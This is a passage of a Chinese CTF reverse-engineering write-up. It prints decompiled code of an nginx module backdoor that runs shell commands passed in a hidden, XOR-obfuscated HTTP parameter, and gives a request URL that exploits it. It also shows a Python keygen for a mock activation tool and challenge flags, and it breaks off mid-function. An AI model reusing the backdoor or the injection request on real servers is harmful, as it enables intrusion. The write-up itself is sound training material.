+<span class="n">builtin_memcpy</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="s">"#1</span><span class="se">\x03\x17</span><span class="s">.</span><span class="se">\x10\n\x135</span><span class="s">/</span><span class="se">\x16</span><span class="s">$</span><span class="se">\r</span><span class="s">6&lt;</span><span class="se">\x0e</span><span class="s"> ,</span><span class="se">\x13F</span><span class="s">"</span><span class="p">,</span><span class="mh">0x14</span><span class="p">);</span>
+<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">uVar16</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">sVar4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">__s</span><span class="p">),</span><span class="w"> </span><span class="n">uVar16</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">sVar4</span><span class="p">;</span><span class="w"> </span><span class="n">uVar16</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uVar16</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">password</span><span class="p">[</span><span class="n">uVar16</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="n">uVar16</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">__s</span><span class="p">[</span><span class="n">uVar16</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="n">nVar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ngx_http_arg</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">uVar16</span><span class="p">,</span><span class="o">&amp;</span><span class="n">arg_value</span><span class="p">);</span><span class="w">             </span><span class="c1">// 从HTTP请求中获取 password 这个参数</span>
+<span class="w">                                                                </span><span class="c1">// 返回 0 表示找到了这个参数</span>
+<span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">nVar5</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">arg_value</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x3ff</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">_Var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_Var2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 子进程执行</span>
+<span class="w">        </span><span class="n">iVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getrlimit64</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">,(</span><span class="n">rlimit64</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">// 关闭所有文件描述符</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(;</span><span class="w"> </span><span class="n">__fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">iVar18</span><span class="p">;</span><span class="w"> </span><span class="n">__fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__fd</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">close</span><span class="p">(</span><span class="n">__fd</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 执行系统命令，也就是说我可以构造 http://ip:port/?password=cp /flag /nginx/html/flag.txt</span>
+<span class="w">        </span><span class="c1">// 把 flag 文件拷贝到网站根目录</span>
+<span class="w">        </span><span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"sh"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_001b8f1b</span><span class="p">,</span><span class="n">local_528</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mh">0x7f</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>对 <code>"#1\x03\x17.\x10\n\x135/\x16$\r6&lt;\x0e ,\x13F"</code> 与 <code>"This_is_a_fake_flag!"</code> 进行异或解密得到 <code>password = wYjdqyyLTppEfSchLMtg</code></p>
+<p>先 <code>http://ip:port/?wYjdqyyLTppEfSchLMtg=cp /flag /nginx/html/flag.txt</code> 把 flag 文件拷贝到网站根目录，然后 <code>http://ip:port/flag.txt</code> 就能获得 Flag: <code>flag{17a7f10e-f07c-4e3f-a080-8b91d94245b4}</code></p>
+<h3 id="re02-itscoffice">RE02-ITSC正版Office激活工具</h3>
+<blockquote>
+<p><strong>描述：</strong> 这是xx大学 ITSC 的会员制 Office 激活工具，必须每个月上交 114514 块钱网费才能获得激活码。你的任务是通过逆向工程破解该工具，找到激活码的生成方式，并生成用户 <code>itsc</code> 的激活码。</p>
+<p>获得激活码后，在外面包裹 <code>flag{}</code> 提交，如激活码是 <code>0123456789abcdef</code>，则提交 <code>flag{0123456789abcdef}</code>。</p>
+</blockquote>
+<p><del>我已经等不及了，快点端上来罢</del></p>
+<p>下发了一个 <code>OfficeActivationTool.exe</code> 和一堆 Qt6 的依赖，不需要用 DIE 分析了</p>
+<p>打开 exe 文件弹出一个激活窗口：</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006182642580.png" data-desc-position="bottom"><img alt="image-20251006182642580" src="../../images/image-20251006182642580.png"></a></p>
+<p>注意到按下按钮之后弹出 “激活失败” 的回答，考虑计算激活码的函数出现在 “按下按钮” ，用 Ghidra 进行逆向，关键词 <code>click</code> 搜索</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006182902827.png" data-desc-position="bottom"><img alt="image-20251006182902827" src="../../images/image-20251006182902827.png"></a></p>
+<p>对 <code>on_activationButton_clicked</code> 函数进行分析，节选了部分内容：</p>
+<p>（Qt对应的反汇编内容易读性相比上一题更好一些）</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// 激活码必须是32位十六进制字符</span>
+<span class="n">local_128</span><span class="p">.</span><span class="n">m_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"^[0-9a-fA-F]*$"</span><span class="p">;</span>
+<span class="n">local_128</span><span class="p">.</span><span class="n">m_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xe</span><span class="p">;</span>
+<span class="n">QString</span><span class="o">::</span><span class="n">fromUtf8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">);</span>
+<span class="n">QRegularExpression</span><span class="o">::</span><span class="n">QRegularExpression</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hexCodePattern</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">// 账户名必须只能包含字母/数字/下划线且不以数字开头</span>
+<span class="n">local_128</span><span class="p">.</span><span class="n">m_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x18</span><span class="p">;</span>
+<span class="n">local_128</span><span class="p">.</span><span class="n">m_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"^[_a-zA-Z][_0-9a-zA-Z]*$"</span><span class="p">;</span>
+<span class="n">QString</span><span class="o">::</span><span class="n">fromUtf8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">);</span>
+<span class="n">QRegularExpression</span><span class="o">::</span><span class="n">QRegularExpression</span><span class="p">(</span><span class="o">&amp;</span><span class="n">accountPattern</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">// 检查激活码格式</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(((</span><span class="n">cVar3</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">'\0'</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">codeText</span><span class="p">.</span><span class="n">d</span><span class="p">.</span><span class="n">size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x20</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">accountText</span><span class="p">.</span><span class="n">d</span><span class="p">.</span><span class="n">size</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 为账户名添加了固定的后缀</span>
+<span class="w">    </span><span class="n">local_130</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xb</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_138</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"@nju.edu.cn"</span><span class="p">;</span>
+<span class="w">    </span><span class="n">QString</span><span class="o">::</span><span class="n">append</span><span class="p">(</span><span class="o">&amp;</span><span class="n">accountText</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_138</span><span class="p">);</span><span class="w">                   </span><span class="c1">// append</span>
+<span class="w">    </span><span class="c1">// 激活码十六进制转字节数组</span>
+<span class="w">    </span><span class="n">QString</span><span class="o">::</span><span class="n">toUtf8_helper</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_88</span><span class="p">);</span><span class="w">                          </span><span class="c1">// to utf8</span>
+<span class="w">    </span><span class="n">QByteArray</span><span class="o">::</span><span class="n">fromHex</span><span class="p">((</span><span class="n">QByteArray</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">);</span><span class="w">               </span><span class="c1">// from hex</span>
+<span class="w">    </span><span class="c1">// 对添加后缀之后的账户名进行哈希计算，Qt的哈希加密默认为 md5</span>
+<span class="w">    </span><span class="n">QString</span><span class="o">::</span><span class="n">toUtf8_helper</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_88</span><span class="p">);</span>
+<span class="w">    </span><span class="n">local_128</span><span class="p">.</span><span class="n">m_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_88</span><span class="p">.</span><span class="n">d</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_128</span><span class="p">.</span><span class="n">m_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">storage_type</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_88</span><span class="p">.</span><span class="n">d</span><span class="p">.</span><span class="n">ptr</span><span class="p">;</span>
+<span class="w">    </span><span class="n">QCryptographicHash</span><span class="o">::</span><span class="n">hash</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,(</span><span class="n">Algorithm</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_128</span><span class="p">);</span><span class="w">  </span><span class="c1">// hash</span>
+<span class="w">    </span><span class="c1">// 比较哈希结果与激活码</span>
+<span class="w">    </span><span class="n">local_128</span><span class="p">.</span><span class="n">m_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_68</span><span class="p">.</span><span class="n">m_data</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_128</span><span class="p">.</span><span class="n">m_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_58</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_148</span><span class="p">.</span><span class="n">m_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">qVar2</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_148</span><span class="p">.</span><span class="n">m_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">psVar1</span><span class="p">;</span>
+<span class="w">    </span><span class="n">iVar4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">QtPrivate</span><span class="o">::</span><span class="n">compareMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_128</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_148</span><span class="p">);</span><span class="w">    </span><span class="c1">// compareMemory</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iVar4</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">pQVar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">QString</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="k">this</span><span class="o">-&gt;</span><span class="n">ui</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x58</span><span class="p">);</span>
+<span class="w">        </span><span class="n">QString</span><span class="o">::</span><span class="n">QString</span><span class="p">((</span><span class="n">QString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,(</span><span class="n">QChar</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_140006196</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span><span class="w"> </span><span class="c1">// "成功"</span>
+<span class="w">        </span><span class="n">QLabel</span><span class="o">::</span><span class="n">setText</span><span class="p">(</span><span class="n">pQVar5</span><span class="p">);</span>
+<span class="w">        </span><span class="k">this</span><span class="o">-&gt;</span><span class="n">activated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">pQVar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">QString</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="k">this</span><span class="o">-&gt;</span><span class="n">ui</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x58</span><span class="p">);</span>
+<span class="w">        </span><span class="n">QString</span><span class="o">::</span><span class="n">QString</span><span class="p">((</span><span class="n">QString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,(</span><span class="n">QChar</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_1400061a0</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span><span class="w"> </span><span class="c1">// "失败"</span>
+<span class="w">        </span><span class="n">QLabel</span><span class="o">::</span><span class="n">setText</span><span class="p">(</span><span class="n">pQVar5</span><span class="p">);</span>
+<span class="w">        </span><span class="k">this</span><span class="o">-&gt;</span><span class="n">activated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>写一个 Python 函数计算一下：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">exp.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">md5_calc</span><span class="p">(</span><span class="n">account</span><span class="p">):</span>
+    <span class="n">account</span> <span class="o">+=</span> <span class="s2">"@nju.edu.cn"</span>
+
+    <span class="c1"># 计算md5</span>
+    <span class="n">md5_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+
+    <span class="c1"># 转换为十六进制字符串</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">md5_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="n">code</span>
+
+<span class="n">account</span> <span class="o">=</span> <span class="s2">"itsc"</span>
+<span class="n">code</span> <span class="o">=</span> <span class="n">md5_calc</span><span class="p">(</span><span class="n">account</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"code: </span><span class="si">{</span><span class="n">code</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>拿到激活码 <code>15F00E032036724774CF4A2D2CA7C63C</code></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006185600169.png" data-desc-position="bottom"><img alt="image-20251006185600169" src="../../images/image-20251006185600169.png"></a></p>
+<p>Flag 就是 <code>flag{15F00E032036724774CF4A2D2CA7C63C}</code></p>
+<h3 id="re03-">RE03-幸运数字</h3>
+<div class="admonition warning">
+<p class="admonition-title">非常规解法注意，和本题的正解几乎没有关系</p>
+<p>I'm so sorry...</p>
+</div>
+<p>下发了一个 exe 文件，尝试进行交互，猜测这个幸运数字是个随机数，猜不中的：</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006190418890.png" data-desc-position="bottom"><img alt="image-20251006190418890" src="../../images/image-20251006190418890.png"></a></p>
+<p>注意到提示：</p>
+<blockquote>
+<p>你可能需要了解一下 [<a href="https://learn.microsoft.com/zh-cn/windows/win32/procthread/using-thread-local-storage">TLS（线程本地存储）</a>] 和 [<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">IsDebuggerPresent</a>]</p>
+</blockquote>
+<p>似乎是对动态调试操作有所反制，所以依旧尝试 Ghidra 静态分析。先搜索一下字符串：</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006193631292.png" data-desc-position="bottom"><img alt="image-20251006193631292" src="../../images/image-20251006193631292.png"></a></p>
+<p>发现有填写正确的庆祝语字符串，定位函数 <code>FUN00401450</code>：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="kr">__fastcall</span><span class="w"> </span><span class="n">FUN_00401450</span><span class="p">(</span><span class="n">undefined4</span><span class="w"> </span><span class="n">param_1</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">param_2</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hHandle</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">uVar1</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">iVar2</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">iVar3</span><span class="p">;</span>
+<span class="w">  </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">unaff_EDI</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">uStack_54</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">iStack_4c</span><span class="p">;</span>
+<span class="w">  </span><span class="n">DWORD</span><span class="w"> </span><span class="n">DStack_48</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">auStack_40</span><span class="w"> </span><span class="p">[</span><span class="mi">15</span><span class="p">];</span>
+
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mh">0xe</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DAT_00404000</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
+<span class="w">  </span><span class="n">FUN_004013b0</span><span class="p">();</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Bad instruction - Truncating control flow here */</span>
+<span class="w">  </span><span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xba637da0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x8c445f89</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x112970aa</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xe2ca658f</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xbc46a994</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7289dd5c</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x21bd739f</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x71233bc</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x67cd6608</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xf80e72bb</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xfa7003e0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mh">0xb</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xfdc39c15</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mh">0xc</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6e7aeeb0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">auStack_40</span><span class="p">[</span><span class="mh">0xd</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x34</span><span class="p">;</span>
+<span class="w">  </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"welcome to TrinityCTF</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">  </span><span class="n">hHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">FUN_004013b0</span><span class="p">();</span>
+<span class="w">  </span><span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+<span class="w">  </span><span class="n">uVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">func_0x00401080</span><span class="p">();</span>
+<span class="w">  </span><span class="n">srand</span><span class="p">(</span><span class="n">uVar1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">iVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">();</span>
+<span class="w">  </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"input your lucky number:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">  </span><span class="n">iVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FUN_00401050</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UNK_00403174</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iVar3</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"invalid input</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hHandle</span><span class="p">,</span><span class="mh">0xffffffff</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">unaff_EDI</span><span class="p">);</span>
+<span class="w">    </span><span class="n">TlsFree</span><span class="p">(</span><span class="n">DStack_48</span><span class="p">);</span>
+<span class="w">    </span><span class="n">func_0x004016c3</span><span class="p">();</span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
